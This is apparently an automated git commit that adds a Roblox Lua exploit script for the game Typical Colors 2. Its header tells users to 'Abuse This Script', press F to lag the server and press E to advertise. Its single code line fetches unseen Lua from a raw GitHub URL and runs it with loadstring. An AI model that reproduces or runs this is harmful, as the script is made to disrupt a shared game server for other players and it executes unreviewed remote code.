82c8c7a8f05888841ca409752d7cfa4db5973dd1
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 16:51:30 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Typical Colors  Godmode Auto Farm Silent aim.lua
@@ -0,0 +1,14 @@
+--[[
+
+Abuse This Script.
+
+How To Use: 
+You Need Rocket Launcher
+Press F To Lag Server Or Spam F
+Press E To Advertise
+
+Made By Mrgunz#2289
+
+]]--
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mrgunz/S/main/TC2_Lag_Server"))();
